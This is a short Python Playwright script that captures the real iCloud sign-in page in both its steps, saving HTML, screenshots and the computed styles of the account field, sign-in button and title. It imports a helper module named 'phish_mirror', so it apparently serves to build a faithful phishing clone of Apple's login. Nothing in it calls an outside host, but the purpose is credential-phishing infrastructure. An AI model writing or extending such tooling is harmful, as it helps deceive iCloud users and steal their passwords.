#!/usr/bin/env python3
"""Capture the real icloud.com sign-in (both steps): HTML + screenshots + key styles."""
from playwright.sync_api import sync_playwright
import phish_mirror as m

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)
    ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    apple = ctx.new_page()
    frame = m.open_icloud_sign_in(apple)
    frame = m.apple_auth_frame(apple) or frame

    # --- Step 1: identifier ---
    with open('icloud_step1.html', 'w', encoding='utf-8') as f:
        f.write(frame.evaluate("() => document.body.outerHTML"))
    apple.screenshot(path='icloud_step1.png')

    # key element styles (step 1)
    styles1 = frame.evaluate("""() => {
        const out = {};
        const grab = (sel, extra) => {
            const el = document.querySelector(sel);
            if (!el) { out[sel] = null; return; }
            const cs = getComputedStyle(el);
            const o = {
                tag: el.tagName, text: (el.innerText||'').slice(0,120),
                placeholder: el.placeholder || null,
                color: cs.color, background: cs.backgroundColor,
                fontFamily: cs.fontFamily, fontSize: cs.fontSize,
                fontWeight: cs.fontWeight, borderRadius: cs.borderRadius,
                border: cs.border, padding: cs.padding, height: cs.height,
                width: cs.width
            };
            if (extra) Object.assign(o, extra(el));
            out[sel] = o;
        };
        grab('#account_name_text_field');
        grab('#sign-in');
        grab('h1, .tk-title, [class*="title"]');
        return out;
    }""")
    import json
    with open('icloud_step1_styles.json', 'w', encoding='utf-8') as f:
        json.dump(styles1, f, indent=2)

    # --- Step 2: password ---
    m.forward_email(apple, frame, 'test@example.com')
    frame = m.apple_auth_frame(apple) or frame
    apple.wait_for_timeout(2500)
    with open('icloud_step2.html', 'w', encoding='utf-8') as f:
        f.write(frame.evaluate("() => document.body.outerHTML"))
    apple.screenshot(path='icloud_step2.png')

    b.close()
    print('captured: icloud_step1.html, icloud_step1.png, icloud_step1_styles.json, icloud_step2.html, icloud_step2.png')
